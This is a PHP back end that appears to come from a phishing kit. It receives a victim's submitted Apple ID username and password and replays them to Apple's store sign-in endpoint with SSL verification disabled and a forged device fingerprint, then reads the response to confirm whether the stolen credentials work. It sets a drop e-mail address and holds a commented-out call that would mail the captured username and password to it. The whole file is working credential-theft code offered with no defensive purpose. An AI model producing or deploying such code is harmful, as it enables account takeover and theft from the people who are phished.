<?
session_start();
$username = $_POST['username'];
$password = $_POST['password'];
$to = "qsd@qsd.com";
$postData = "";

if($username != "" )
{
	if($password != "")
	{
checklogin($username, $password, $to);
}
else
{
	header("location: index.php?msg=2");
}
}else
{
	header("location: index.php?msg=2");
}


function connectCurl($url)
{
	$ch = curl_init(); 
	$timeout = 5;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}
function postCurl($url,$postData)
{
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$postData);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$data = curl_exec ($ch);
	curl_close ($ch);
	return $data;
}
function checklogin($username, $password, $to){
        $ch = curl_init();      
        curl_setopt($ch, CURLOPT_URL, "https://secure1.store.apple.com/us/sentryx/sign_in");
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "login-appleId=$username&login-password=$password&deviceID=NDa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQBTuX38.WUMnGWVQdg1kzDlSgyyIT1nj.rIN4WzcjftckcKyAd65hz74WySXvOxwaw4a8vSPzIAQYzowRsb97FZ16XhayIz40DIAalnjjftckgweJhwAan0XrnE9XXTneNufuyPBDjaY2ftckuyPB884akHGOg41a3EN8_S1L1rJhCVW0VW_xGMuJjkWiK7.M_0p6RgDPYOe530Qs.BN.B975kFak3E90yZnxHfe2ReF.j9ffSX3NlY5p4fTCcvPUU0vp5bIs0UjLHi3qwkkxHxQNv__5BNlan0Os5Apw.9Dj&fdcBrowserData={'U':'Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0','L':'en','Z':'GMT+01:00','V':'1.0'}&_a=login.sign&c=aHR0cDovL3N0b3JlLmFwcGxlLmNvbS91c3wxYW9zZmU4OGZjNWIyNThhYWVhOTM5MzVjZjI2NTk1OGE3MWUwY2Y0MmI2OA&_fid=si&r=SCDHYHP7CY4H9XK2H&s=aHR0cDovL3N0b3JlLmFwcGxlLmNvbS91c3wxYW9zZmU4OGZjNWIyNThhYWVhOTM5MzVjZjI2NTk1OGE3MWUwY2Y0MmI2OA&t=S99KKATD9FP9FHCP4");
        curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
        $login = curl_exec($ch);
        $check = (preg_match('/incorrectly/',$login)) ? true:false;
		$check2 = (preg_match('/locked/',$login)) ? true:false;
        if($check == true){
             // header("location: index.php?msg=1");

$status = false;
echo $status;
//echo "NO";
		}
	    elseif($check2 == true){
             // header("location: index.php?msg=2");

$status = false;
echo $status;
//echo "NO";
        }else{    

$status = True;
echo $status;
//echo "yes";
             $_SESSION['logged'] = "1";
			  //send_mail($to, $username, $password);
			 // header("location: account");
        }

         }
?>